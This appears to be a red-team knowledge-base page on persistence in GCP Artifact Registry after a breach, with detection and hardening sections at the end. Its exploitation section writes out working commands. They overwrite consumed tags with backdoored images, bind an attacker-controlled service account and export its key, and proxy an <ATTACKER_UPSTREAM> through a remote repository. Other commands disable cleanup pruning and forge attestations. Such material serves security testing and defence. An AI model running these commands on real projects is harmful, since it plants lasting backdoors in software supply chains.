---
cstg_id: CSTG-GCP-ARTIFACT-REGISTRY-PERSIST
title: "GCP Artifact Registry - Persistence"
provider: gcp
service: artifact-registry
phase: persistence
required_access: assumed-breach
required_permissions:
  - artifactregistry.repositories.uploadArtifacts
  - artifactregistry.repositories.setIamPolicy
  - artifactregistry.repositories.create
  - artifactregistry.tags.create
  - artifactregistry.tags.update
  - artifactregistry.repositories.update
tools:
  - gcloud CLI
  - Artifact Registry REST API
  - Docker CLI / OCI client
  - crane / skopeo
  - cosign
references:
  - https://cloud.google.com/artifact-registry/docs/access-control
  - https://cloud.google.com/artifact-registry/docs/repositories/cleanup-policy
  - https://cloud.google.com/artifact-registry/docs/repositories/remote-repo
  - https://cloud.google.com/iam/docs/understanding-roles#artifact-registry-roles
  - https://cloud.google.com/architecture/binary-authorization-with-cloud-build-and-gke
license: CC BY-SA 4.0
---

## Summary

Artifact Registry offers durable, often-overlooked persistence because the supply chain is *re-executed continuously*: every autoscale event, node replacement, redeploy, and build re-pulls and re-runs the stored artifacts. Code planted in a repository therefore re-establishes a foothold automatically, surviving the cleanup of individual compromised instances and even credential rotation, because the trust lives in the artifact rather than in any single host or session.

Persistence techniques in this service fall into three categories:

1. **Backdoored artifacts** — poisoned base images, popular tags, or language packages that re-deliver a payload every time a consumer pulls them. This is the most resilient mechanism; it outlives instance teardown and reboots.
2. **IAM-based persistence** — repository-level bindings, or new service accounts/keys with registry roles, that retain push/pull access even after the original credential is revoked.
3. **Infrastructure-based persistence** — attacker-created repositories, remote/virtual repositories that proxy attacker-controlled upstreams, and weakened retention/cleanup policies that preserve malicious versions.

This page assumes an assumed-breach foothold with write or admin access to one or more repositories. It builds on [Privilege Escalation](../03-privilege-escalation/gcp-artifact-registry-privesc.md) (which establishes the tampering primitive) and [Enumeration](../02-services/gcp-artifact-registry-enum.md) (which maps consumers).

## Prerequisites

- A foothold credential holding one or more of the `required_permissions` (typically `roles/artifactregistry.writer`, `repoAdmin`, or `admin`, or the ability to mint such an identity).
- Knowledge of which repositories/tags are actively consumed, so the planted artifact is actually re-pulled (see Enumeration).
- For IAM persistence, the ability to create or modify principals (`iam.serviceAccounts.create`, key creation, or repository `setIamPolicy`).

## Misconfigurations & Findings

- **Mutable, frequently-pulled tags** (`:latest`, `:stable`) — ideal re-delivery vehicle; the payload re-runs on every scale-up.
- **Base images shared across many builds** — poisoning one base image propagates to all downstream images on next rebuild.
- **No image signing / Binary Authorization** — nothing prevents the tampered artifact from being deployed.
- **Self-service repository IAM** (`setIamPolicy` held by workloads) — enables durable binding additions.
- **Long-lived service-account keys with registry roles** — survive most rotation processes.
- **Cleanup policies in dry-run or disabled** — malicious versions are never pruned.
- **Attacker-created remote/virtual repositories** — silently inject attacker upstreams into the dependency graph.

## Exploitation

### Backdoored image / tag re-delivery (artifactregistry.repositories.uploadArtifacts, tags.update)

Overwrite a consumed tag, or re-point it to an attacker digest, so the payload is re-delivered on every pull. Unlike a one-shot privilege escalation, the goal here is *durability*: keep the legitimate functionality intact so the image is not removed, and rely on operational churn to re-execute the payload indefinitely.

```bash
gcloud auth configure-docker <LOCATION>-docker.pkg.dev

# Build an image that preserves the original entrypoint and adds a quiet beacon/backdoor
docker build -t <LOCATION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/<IMAGE>:latest .
docker push <LOCATION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/<IMAGE>:latest
```

To minimise footprint, `crane` can re-point an existing tag to an attacker-built digest without a full rebuild, or push additional benign-looking tags that serve the payload:

```bash
crane auth login <LOCATION>-docker.pkg.dev -u oauth2accesstoken -p "$(gcloud auth print-access-token)"
crane tag <LOCATION>-docker.pkg.dev/<PROJECT_ID>/<REPO>/<IMAGE>@sha256:<BACKDOOR_DIGEST> latest
```

Because the trust anchor is the stored image, this persists across instance termination, node pool recreation, and session/credential expiry — any new replica pulls the backdoored tag. The same applies to poisoning a widely-consumed **base image** (re-delivers on every downstream rebuild) or a **language package** version pulled by builds.

### IAM persistence via repository bindings (artifactregistry.repositories.setIamPolicy)

Add a durable binding that survives revocation of the original foothold. Prefer a binding to a controlled service account (more durable and less conspicuous than a user), or to a group the attacker controls:

```bash
gcloud artifacts repositories add-iam-policy-binding <REPO> \
  --location=<LOCATION> --project=<PROJECT_ID> \
  --member="serviceAccount:<CONTROLLED_SA>@<PROJECT_ID>.iam.gserviceaccount.com" \
  --role="roles/artifactregistry.repoAdmin"
```

For long-lived access independent of any session, create a service account (or reuse one) with a registry role and export a key. This key keeps working until explicitly deleted, surviving password/SSO changes:

```bash
gcloud iam service-accounts create reg-sync --project=<PROJECT_ID>
gcloud artifacts repositories add-iam-policy-binding <REPO> \
  --location=<LOCATION> --project=<PROJECT_ID> \
  --member="serviceAccount:reg-sync@<PROJECT_ID>.iam.gserviceaccount.com" \
  --role="roles/artifactregistry.writer"
gcloud iam service-accounts keys create key.json \
  --iam-account=reg-sync@<PROJECT_ID>.iam.gserviceaccount.com
```

The exported key can then authenticate to any endpoint using `_json_key`/`_json_key_base64`:

```bash
cat key.json | docker login -u _json_key --password-stdin https://<LOCATION>-docker.pkg.dev
```

### Attacker-created repositories and remote/virtual upstreams (artifactregistry.repositories.create, repositories.update)

Create a new repository to host payloads (less likely to be inspected than existing production repos), or — more insidiously — create/modify a **remote repository** that proxies an attacker-controlled upstream, or alter a **virtual repository's** upstream list/priority so attacker content is silently injected into the dependency graph going forward:

```bash
gcloud artifacts repositories create cache-mirror \
  --repository-format=docker --mode=remote-repository \
  --remote-docker-repo=<ATTACKER_UPSTREAM> \
  --location=<LOCATION> --project=<PROJECT_ID>
```

Adding such a repository as a high-priority upstream of a consumed virtual repository causes future pulls to resolve attacker content without altering any existing image, providing persistence that is decoupled from the repositories defenders are likely to scrub.

### Weakening retention so malicious versions survive (artifactregistry.repositories.update)

Disable or set cleanup policies to dry-run so planted versions are never pruned, and so deleted-version forensics are harder:

```bash
gcloud artifacts repositories update <REPO> \
  --location=<LOCATION> --project=<PROJECT_ID> --cleanup-policy-dry-run
```

### Surviving Binary Authorization

Where Binary Authorization is enforced, durable persistence depends on the attestation path rather than the image bytes. If the foothold can reach an attestor's signing key or the CI identity that creates attestations, the attacker can produce valid attestations for backdoored images (e.g. with `cosign sign`), so the poisoned artifact passes admission. Hardening the signing key custody (next section) directly limits this.

## Detection & Logging

In **Cloud Audit Logs** (`artifactregistry.googleapis.com`):

- `UploadArtifact` / image push to production tags from unexpected principals or IPs, or pushes that change a previously-stable tag's digest.
- `SetIamPolicy` adding `writer`/`repoAdmin`/`admin`/`allUsers` — alert and review.
- `CreateRepository`, especially `mode=REMOTE_REPOSITORY`/`VIRTUAL_REPOSITORY`, and `UpdateRepository` changing upstreams, priorities, or cleanup policies.
- Correlate with IAM audit logs for `CreateServiceAccount` and `CreateServiceAccountKey` events tied to registry roles.

Defenders should baseline which principals push to each repository and which upstreams each virtual/remote repo references, then alert on deviation. Image-digest drift on long-stable tags is a strong indicator.

```
protoPayload.serviceName="artifactregistry.googleapis.com"
protoPayload.methodName=~"(UploadArtifact|SetIamPolicy|CreateRepository|UpdateRepository)"
```

## Remediation & Hardening

- **Enforce immutable tags** and **deploy by digest** so a re-pushed tag cannot silently re-deliver a payload.
- **Enforce Binary Authorization** with signed attestations; protect attestor signing keys in Cloud KMS/HSM with tight IAM so attestations cannot be forged. Verify signatures at admission.
- **Least privilege and separation of duties**: restrict `writer`/`repoAdmin`/`admin` and `setIamPolicy` to dedicated, audited CI/CD identities; deny these to runtime workload SAs.
- **Disable service-account key creation** via org policy (`iam.disableServiceAccountKeyCreation`) and prefer Workload Identity / short-lived credentials, removing the long-lived-key persistence vector.
- **Enforce active (non-dry-run) cleanup policies** and alert on policy changes to dry-run/disabled.
- **Lock down remote/virtual repositories**: restrict who can create or modify them, pin upstreams, and keep internal upstreams at highest priority.
- **Enable Data Access audit logs** and **VPC Service Controls**; review for digest drift and unexpected new repositories/bindings on a schedule.
- Periodically reconcile repository IAM and service-account inventory against an approved baseline to catch persistence bindings and rogue keys.

## Tools

- **gcloud CLI** — repository creation/update, IAM bindings, service-account and key creation.
- **Docker CLI / crane / skopeo** — build, push, re-tag, and copy backdoored artifacts.
- **cosign** — signing context for Binary Authorization (and signature-forgery risk analysis).
- **Artifact Registry REST API** — scripted persistence operations.

## References

- Artifact Registry access control — https://cloud.google.com/artifact-registry/docs/access-control
- Cleanup policies — https://cloud.google.com/artifact-registry/docs/repositories/cleanup-policy
- Remote and virtual repositories — https://cloud.google.com/artifact-registry/docs/repositories/remote-repo
- Predefined Artifact Registry IAM roles — https://cloud.google.com/iam/docs/understanding-roles#artifact-registry-roles
- Binary Authorization with Cloud Build and GKE — https://cloud.google.com/architecture/binary-authorization-with-cloud-build-and-gke
